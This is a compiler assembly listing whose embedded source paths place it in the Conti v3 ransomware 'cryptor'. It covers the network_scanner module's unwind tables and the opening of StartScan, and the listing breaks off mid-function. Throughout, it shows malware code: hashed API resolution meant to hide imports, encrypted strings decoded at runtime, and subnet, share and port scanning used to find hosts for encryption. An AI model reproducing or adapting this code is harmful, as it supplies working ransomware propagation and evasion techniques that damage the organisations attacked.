	DD	07006520aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWSASocketW@@YA_KHHHPEAU_WSAPROTOCOL_INFOW@@IK@Z DD 010401H
	DD	06204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pbind@@YAH_KPEBUsockaddr@@H@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?psetsockopt@@YAH_KHHPEBDH@Z DD 020601H
	DD	030025206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pgetsockopt@@YAH_KHHPEADPEAH@Z DD 040a01H
	DD	08340aH
	DD	07006520aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pshutdown@@YAH_KH@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWSAStartup@@YAHGPEAUWSAData@@@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWSACleanup@@YAHXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pStrStrIA@@YAPEBDPEBD0@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pinet_ntoa@@YAPEADUin_addr@@@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetCurrentIpAddress@@YAKXZ DD 021919H
	DD	0270107H
	DD	imagerel __GSHandlerCheck
	DD	0120H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetConnectEX@@YAHXZ DD 041919H
	DD	010340aH
	DD	07006d20aH
	DD	imagerel __GSHandlerCheck
	DD	068H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$7$?GetSubnets@@YAHPEAUsubnet_list_@@@Z DD 021H
	DD	imagerel $LN561
	DD	imagerel $LN561+593
	DD	imagerel $unwind$?GetSubnets@@YAHPEAUsubnet_list_@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$6$?GetSubnets@@YAHPEAUsubnet_list_@@@Z DD 021H
	DD	imagerel $LN561+593
	DD	imagerel $LN561+1141
	DD	imagerel $chain$0$?GetSubnets@@YAHPEAUsubnet_list_@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$5$?GetSubnets@@YAHPEAUsubnet_list_@@@Z DD 021H
	DD	imagerel $LN561+1141
	DD	imagerel $LN561+1160
	DD	imagerel $chain$1$?GetSubnets@@YAHPEAUsubnet_list_@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$4$?GetSubnets@@YAHPEAUsubnet_list_@@@Z DD 061821H
	DD	02ef418H
	DD	02fe410H
	DD	037d408H
	DD	imagerel $LN561+1141
	DD	imagerel $LN561+1160
	DD	imagerel $chain$1$?GetSubnets@@YAHPEAUsubnet_list_@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$?GetSubnets@@YAHPEAUsubnet_list_@@@Z DD 020821H
	DD	036c408H
	DD	imagerel $LN561+593
	DD	imagerel $LN561+1141
	DD	imagerel $chain$0$?GetSubnets@@YAHPEAUsubnet_list_@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$0$?GetSubnets@@YAHPEAUsubnet_list_@@@Z DD 020821H
	DD	0353408H
	DD	imagerel $LN561
	DD	imagerel $LN561+593
	DD	imagerel $unwind$?GetSubnets@@YAHPEAUsubnet_list_@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetSubnets@@YAHPEAUsubnet_list_@@@Z DD 051e19H
	DD	0300110H
	DD	060037004H
	DD	05002H
	DD	imagerel __GSHandlerCheck
	DD	0160H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$4$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z DD 021H
	DD	imagerel $LN243
	DD	imagerel $LN243+146
	DD	imagerel $unwind$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$3$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z DD 021H
	DD	imagerel $LN243+146
	DD	imagerel $LN243+168
	DD	imagerel $chain$0$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z DD 041021H
	DD	0167410H
	DD	0203408H
	DD	imagerel $LN243+146
	DD	imagerel $LN243+168
	DD	imagerel $chain$0$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$0$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z DD 020821H
	DD	0176408H
	DD	imagerel $LN243
	DD	imagerel $LN243+146
	DD	imagerel $unwind$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z DD 072419H
	DD	0180116H
	DD	0e008f00aH
	DD	0c004d006H
	DD	05002H
	DD	imagerel __GSHandlerCheck
	DD	0a0H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?HostHandler@@YAKPEAX@Z DD 072519H
	DD	0177417H
	DD	0163417H
	DD	0140117H
	DD	0500bH
	DD	imagerel __GSHandlerCheck
	DD	090H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?AddHost@@YAHK@Z DD 048319H
	DD	0d7483H
	DD	030029206H
	DD	imagerel __GSHandlerCheck
	DD	048H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$6$?CreateHostTable@@YAHXZ DD 020021H
	DD	0117400H
	DD	imagerel $LN53
	DD	imagerel $LN53+58
	DD	imagerel $unwind$?CreateHostTable@@YAHXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$5$?CreateHostTable@@YAHXZ DD 0c2e21H
	DD	010642eH
	DD	0af41fH
	DD	0bc41aH
	DD	0117415H
	DD	0f540aH
	DD	0e3405H
	DD	imagerel $LN53
	DD	imagerel $LN53+58
	DD	imagerel $unwind$?CreateHostTable@@YAHXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?CreateHostTable@@YAHXZ DD 021519H
	DD	0e002b206H
	DD	imagerel __GSHandlerCheck
	DD	048H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$3$?ScanHosts@@YAXXZ DD 021H
	DD	imagerel $LN19
	DD	imagerel $LN19+37
	DD	imagerel $unwind$?ScanHosts@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?ScanHosts@@YAXXZ DD 061921H
	DD	0107419H
	DD	0f640fH
	DD	0e5405H
	DD	imagerel $LN19
	DD	imagerel $LN19+37
	DD	imagerel $unwind$?ScanHosts@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?ScanHosts@@YAXXZ DD 021519H
	DD	03002b206H
	DD	imagerel __GSHandlerCheck
	DD	058H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?CompleteAsyncConnect@@YAH_K@Z DD 041919H
	DD	0b340aH
	DD	07006720aH
	DD	imagerel __GSHandlerCheck
	DD	038H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?TimerCallback@@YAXPEAXE@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?PortScanHandler@@YAKPEAX@Z DD 0a2919H
	DD	013741aH
	DD	012641aH
	DD	011541aH
	DD	010341aH
	DD	0e016d21aH
	DD	imagerel __GSHandlerCheck
	DD	068H
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?StartScan@network_scanner@@YAXXZ
_TEXT	SEGMENT
$T4 = 80
$T2 = 120
$T5 = 168
$T6 = 224
$T3 = 288
guid$7 = 368
dwBytes$8 = 384
WsaData$ = 400
szHostName$9 = 816
__$ArrayPad$ = 1072
?StartScan@network_scanner@@YAXXZ PROC			; network_scanner::StartScan, COMDAT

; 624  : {

$LN1120:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 74 24 10	 mov	 QWORD PTR [rsp+16], rsi
  0000a	48 89 7c 24 18	 mov	 QWORD PTR [rsp+24], rdi
  0000f	4c 89 74 24 20	 mov	 QWORD PTR [rsp+32], r14
  00014	55		 push	 rbp
  00015	48 8d ac 24 c0
	fc ff ff	 lea	 rbp, QWORD PTR [rsp-832]
  0001d	48 81 ec 40 04
	00 00		 sub	 rsp, 1088		; 00000440H
  00024	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0002b	48 33 c4	 xor	 rax, rsp
  0002e	48 89 85 30 03
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp-256], rax

; 626  : 	HANDLE hHostHandler = NULL, hPortScan = NULL;

  00035	33 db		 xor	 ebx, ebx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 967  : 	pFunction = (int(WINAPI*)(WORD, LPWSADATA))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x86ffe89f, 27);//GetProcAddress(hWs2_32, OBFA("WSAStartup"));

  00037	41 b8 9f e8 ff
	86		 mov	 r8d, -2030049121	; 86ffe89fH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 626  : 	HANDLE hHostHandler = NULL, hPortScan = NULL;

  0003d	8b f3		 mov	 esi, ebx

; 627  : 	PSUBNET_INFO SubnetInfo = NULL;
; 628  : 
; 629  : 	g_ActiveOperations = 0;

  0003f	89 1d 00 00 00
	00		 mov	 DWORD PTR ?g_ActiveOperations@@3JA, ebx ; g_ActiveOperations
  00045	44 8b f3	 mov	 r14d, ebx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 967  : 	pFunction = (int(WINAPI*)(WORD, LPWSADATA))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x86ffe89f, 27);//GetProcAddress(hWs2_32, OBFA("WSAStartup"));

  00048	8d 53 15	 lea	 edx, QWORD PTR [rbx+21]
  0004b	44 8d 4b 1b	 lea	 r9d, QWORD PTR [rbx+27]
  0004f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 968  : 	return pFunction(wVersionRequired, lpWSAData);

  00054	b9 02 02 00 00	 mov	 ecx, 514		; 00000202H
  00059	48 8d 95 90 00
	00 00		 lea	 rdx, QWORD PTR WsaData$[rbp-256]
  00060	ff d0		 call	 rax

; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  00062	8d 53 0f	 lea	 edx, QWORD PTR [rbx+15]
  00065	41 b8 d3 40 de
	dd		 mov	 r8d, -572636973		; ddde40d3H
  0006b	44 8d 4b 49	 lea	 r9d, QWORD PTR [rbx+73]
  0006f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 424  : 	return pFunction(lpCriticalSection);

  00074	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A ; g_CriticalSection
  0007b	ff d0		 call	 rax

; 910  : 	pFunction = (SOCKET(WINAPI*)(int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0xa7922856, 32);//GetProcAddress(hWs2_32, OBFA("WSASocketW"));

  0007d	8d 53 15	 lea	 edx, QWORD PTR [rbx+21]
  00080	41 b8 56 28 92
	a7		 mov	 r8d, -1483593642	; a7922856H
  00086	44 8d 4b 20	 lea	 r9d, QWORD PTR [rbx+32]
  0008a	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 911  : 	return pFunction(af, type, protocol, lpProtocolInfo, g, dwFlags);

  0008f	45 33 c9	 xor	 r9d, r9d
  00092	89 5c 24 28	 mov	 DWORD PTR [rsp+40], ebx
  00096	8d 53 01	 lea	 edx, QWORD PTR [rbx+1]
  00099	89 5c 24 20	 mov	 DWORD PTR [rsp+32], ebx
  0009d	8d 4b 02	 lea	 ecx, QWORD PTR [rbx+2]
  000a0	44 8d 43 06	 lea	 r8d, QWORD PTR [rbx+6]
  000a4	ff d0		 call	 rax
  000a6	48 8b f8	 mov	 rdi, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 113  : 	if (sock == INVALID_SOCKET)

  000a9	48 83 f8 ff	 cmp	 rax, -1
  000ad	75 07		 jne	 SHORT $LN30@StartScan

; 114  : 		return FALSE;

  000af	8b cb		 mov	 ecx, ebx
  000b1	e9 96 00 00 00	 jmp	 $LN32@StartScan
$LN30@StartScan:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 874  : 	pFunction = (int(WINAPI*)(SOCKET, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8460e293, 35);//GetProcAddress(hWs2_32, OBFA("WSAIoctl"));

  000b6	ba 15 00 00 00	 mov	 edx, 21
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 116  : 	GUID guid = WSAID_CONNECTEX;

  000bb	c7 45 70 b9 07
	a2 25		 mov	 DWORD PTR guid$7[rbp-256], 631375801 ; 25a207b9H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 874  : 	pFunction = (int(WINAPI*)(SOCKET, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8460e293, 35);//GetProcAddress(hWs2_32, OBFA("WSAIoctl"));

  000c2	41 b8 93 e2 60
	84		 mov	 r8d, -2074025325	; 8460e293H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 116  : 	GUID guid = WSAID_CONNECTEX;

  000c8	c7 45 74 f3 dd
	60 46		 mov	 DWORD PTR guid$7[rbp-252], 1180753395 ; 4660ddf3H
  000cf	c7 45 78 8e e9
	76 e5		 mov	 DWORD PTR guid$7[rbp-248], -445191794 ; e576e98eH
  000d6	c7 45 7c 8c 74
	06 3e		 mov	 DWORD PTR guid$7[rbp-244], 1040610444 ; 3e06748cH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 874  : 	pFunction = (int(WINAPI*)(SOCKET, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8460e293, 35);//GetProcAddress(hWs2_32, OBFA("WSAIoctl"));

  000dd	44 8d 4a 0e	 lea	 r9d, QWORD PTR [rdx+14]
  000e1	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 875  : 	return pFunction(s, dwIoControlCode, lpvInBuffer, cbInBuffer, lpvOutBuffer, cbOutBuffer, lpcbBytesReturned, lpOverlapped, lpCompletionRoutine);

  000e6	48 89 5c 24 40	 mov	 QWORD PTR [rsp+64], rbx
  000eb	48 8d 8d 80 00
	00 00		 lea	 rcx, QWORD PTR dwBytes$8[rbp-256]
  000f2	48 89 5c 24 38	 mov	 QWORD PTR [rsp+56], rbx
  000f7	4c 8d 45 70	 lea	 r8, QWORD PTR guid$7[rbp-256]
  000fb	48 89 4c 24 30	 mov	 QWORD PTR [rsp+48], rcx
  00100	41 b9 10 00 00
	00		 mov	 r9d, 16
  00106	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_ConnectEx@@3P6AH_KPEBUsockaddr@@HPEAXKPEAKPEAU_OVERLAPPED@@@ZEA ; g_ConnectEx
  0010d	c7 44 24 28 08
	00 00 00	 mov	 DWORD PTR [rsp+40], 8
  00115	48 89 4c 24 20	 mov	 QWORD PTR [rsp+32], rcx
  0011a	ba 06 00 00 c8	 mov	 edx, -939524090		; c8000006H
  0011f	48 8b cf	 mov	 rcx, rdi
  00122	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 122  : 	if (rc != 0)

  00124	85 c0		 test	 eax, eax
  00126	74 04		 je	 SHORT $LN31@StartScan

; 123  : 		return FALSE;

  00128	8b cb		 mov	 ecx, ebx
  0012a	eb 20		 jmp	 SHORT $LN32@StartScan
$LN31@StartScan:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 883  : 	pFunction = (int(WINAPI*)(SOCKET))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x3e3c66ba, 34);//GetProcAddress(hWs2_32, OBFA("closesocket"));

  0012c	ba 15 00 00 00	 mov	 edx, 21
  00131	41 b8 ba 66 3c
	3e		 mov	 r8d, 1044145850		; 3e3c66baH
  00137	44 8d 4a 0d	 lea	 r9d, QWORD PTR [rdx+13]
  0013b	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 884  : 	return pFunction(s);

  00140	48 8b cf	 mov	 rcx, rdi
  00143	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 126  : 	if (rc != 0)

  00145	85 c0		 test	 eax, eax
  00147	8b cb		 mov	 ecx, ebx
  00149	0f 94 c1	 sete	 cl
$LN32@StartScan:

; 630  : 	pWSAStartup(MAKEWORD(2, 2), &WsaData);
; 631  : 	pInitializeCriticalSection(&g_CriticalSection);
; 632  : 
; 633  : 	if (!GetConnectEX()) {

  0014c	85 c9		 test	 ecx, ecx
  0014e	0f 85 2f 01 00
	00		 jne	 $LN11@StartScan
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00154	88 5c 24 78	 mov	 BYTE PTR $T2[rsp], bl
  00158	c6 44 24 79 3c	 mov	 BYTE PTR $T2[rsp+1], 60	; 0000003cH
  0015d	c6 44 24 7a 6b	 mov	 BYTE PTR $T2[rsp+2], 107 ; 0000006bH
  00162	c6 44 24 7b 14	 mov	 BYTE PTR $T2[rsp+3], 20
  00167	c6 44 24 7c 6b	 mov	 BYTE PTR $T2[rsp+4], 107 ; 0000006bH
  0016c	c6 44 24 7d 2d	 mov	 BYTE PTR $T2[rsp+5], 45	; 0000002dH
  00171	c6 44 24 7e 6b	 mov	 BYTE PTR $T2[rsp+6], 107 ; 0000006bH
  00176	c6 44 24 7f 37	 mov	 BYTE PTR $T2[rsp+7], 55	; 00000037H
  0017b	c6 45 80 6b	 mov	 BYTE PTR $T2[rbp-248], 107 ; 0000006bH
  0017f	c6 45 81 25	 mov	 BYTE PTR $T2[rbp-247], 37 ; 00000025H
  00183	c6 45 82 6b	 mov	 BYTE PTR $T2[rbp-246], 107 ; 0000006bH
  00187	c6 45 83 16	 mov	 BYTE PTR $T2[rbp-245], 22
  0018b	c6 45 84 6b	 mov	 BYTE PTR $T2[rbp-244], 107 ; 0000006bH
  0018f	c6 45 85 0c	 mov	 BYTE PTR $T2[rbp-243], 12
  00193	c6 45 86 6b	 mov	 BYTE PTR $T2[rbp-242], 107 ; 0000006bH
  00197	c6 45 87 39	 mov	 BYTE PTR $T2[rbp-241], 57 ; 00000039H
  0019b	c6 45 88 6b	 mov	 BYTE PTR $T2[rbp-240], 107 ; 0000006bH
  0019f	c6 45 89 25	 mov	 BYTE PTR $T2[rbp-239], 37 ; 00000025H
  001a3	c6 45 8a 6b	 mov	 BYTE PTR $T2[rbp-238], 107 ; 0000006bH
  001a7	c6 45 8b 16	 mov	 BYTE PTR $T2[rbp-237], 22
  001ab	c6 45 8c 6b	 mov	 BYTE PTR $T2[rbp-236], 107 ; 0000006bH
  001af	c6 45 8d 3c	 mov	 BYTE PTR $T2[rbp-235], 60 ; 0000003cH
  001b3	c6 45 8e 6b	 mov	 BYTE PTR $T2[rbp-234], 107 ; 0000006bH
  001b7	c6 45 8f 56	 mov	 BYTE PTR $T2[rbp-233], 86 ; 00000056H
  001bb	c6 45 90 6b	 mov	 BYTE PTR $T2[rbp-232], 107 ; 0000006bH
  001bf	c6 45 91 2d	 mov	 BYTE PTR $T2[rbp-231], 45 ; 0000002dH
  001c3	c6 45 92 6b	 mov	 BYTE PTR $T2[rbp-230], 107 ; 0000006bH
  001c7	c6 45 93 2d	 mov	 BYTE PTR $T2[rbp-229], 45 ; 0000002dH
  001cb	c6 45 94 6b	 mov	 BYTE PTR $T2[rbp-228], 107 ; 0000006bH
  001cf	c6 45 95 39	 mov	 BYTE PTR $T2[rbp-227], 57 ; 00000039H
  001d3	c6 45 96 6b	 mov	 BYTE PTR $T2[rbp-226], 107 ; 0000006bH
  001d7	c6 45 97 66	 mov	 BYTE PTR $T2[rbp-225], 102 ; 00000066H
  001db	c6 45 98 6b	 mov	 BYTE PTR $T2[rbp-224], 107 ; 0000006bH
  001df	c6 45 99 25	 mov	 BYTE PTR $T2[rbp-223], 37 ; 00000025H
  001e3	c6 45 9a 6b	 mov	 BYTE PTR $T2[rbp-222], 107 ; 0000006bH
  001e7	c6 45 9b 0f	 mov	 BYTE PTR $T2[rbp-221], 15
  001eb	c6 45 9c 6b	 mov	 BYTE PTR $T2[rbp-220], 107 ; 0000006bH
  001ef	c6 45 9d 4a	 mov	 BYTE PTR $T2[rbp-219], 74 ; 0000004aH
  001f3	c6 45 9e 6b	 mov	 BYTE PTR $T2[rbp-218], 107 ; 0000006bH
  001f7	c6 45 9f 58	 mov	 BYTE PTR $T2[rbp-217], 88 ; 00000058H
  001fb	c6 45 a0 6b	 mov	 BYTE PTR $T2[rbp-216], 107 ; 0000006bH
  001ff	c6 45 a1 6b	 mov	 BYTE PTR $T2[rbp-215], 107 ; 0000006bH
  00203	c6 45 a2 6b	 mov	 BYTE PTR $T2[rbp-214], 107 ; 0000006bH
  00207	0f b6 44 24 79	 movzx	 eax, BYTE PTR $T2[rsp+1]

; 58   :         return m_isDecrypted;

  0020c	0f b6 44 24 78	 movzx	 eax, BYTE PTR $T2[rsp]

; 63   :         if (!isDecrypted())

  00211	84 c0		 test	 al, al
  00213	75 5f		 jne	 SHORT $LN132@StartScan
  00215	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL133@StartScan:

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00220	0f b6 4c 1c 79	 movzx	 ecx, BYTE PTR $T2[rsp+rbx+1]

; 40   :     return (a % n + n) % n;

  00225	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0022a	83 e9 6b	 sub	 ecx, 107		; 0000006bH
  0022d	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00231	41 f7 e8	 imul	 r8d
  00234	41 03 d0	 add	 edx, r8d
  00237	c1 fa 06	 sar	 edx, 6
  0023a	8b c2		 mov	 eax, edx
  0023c	c1 e8 1f	 shr	 eax, 31
  0023f	03 d0		 add	 edx, eax
  00241	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00244	44 2b c0	 sub	 r8d, eax
  00247	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0024c	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00250	41 f7 e8	 imul	 r8d
  00253	41 03 d0	 add	 edx, r8d
  00256	c1 fa 06	 sar	 edx, 6
  00259	8b c2		 mov	 eax, edx
  0025b	c1 e8 1f	 shr	 eax, 31
  0025e	03 d0		 add	 edx, eax
  00260	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00263	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00266	44 88 44 1c 79	 mov	 BYTE PTR $T2[rsp+rbx+1], r8b
  0026b	48 ff c3	 inc	 rbx
  0026e	48 83 fb 2a	 cmp	 rbx, 42			; 0000002aH
  00272	72 ac		 jb	 SHORT $LL133@StartScan
$LN132@StartScan:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 635  : 		logs::Write(OBFW(L"Can't get ConnectEx."));

  00274	48 8d 4c 24 79	 lea	 rcx, QWORD PTR $T2[rsp+1]
  00279	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 681  : 	pWaitForSingleObject(hHostHandler, INFINITE);
; 682  : 
; 683  : cleanup:

  0027e	e9 06 07 00 00	 jmp	 $cleanup$1121
$LN11@StartScan:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 845  : 	pFunction = (int (WINAPI*)(char*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8ec21b05, 37);//GetProcAddress(hWs2_32, OBFA("gethostname"));

  00283	ba 15 00 00 00	 mov	 edx, 21
  00288	41 b8 05 1b c2
	8e		 mov	 r8d, -1899881723	; 8ec21b05H
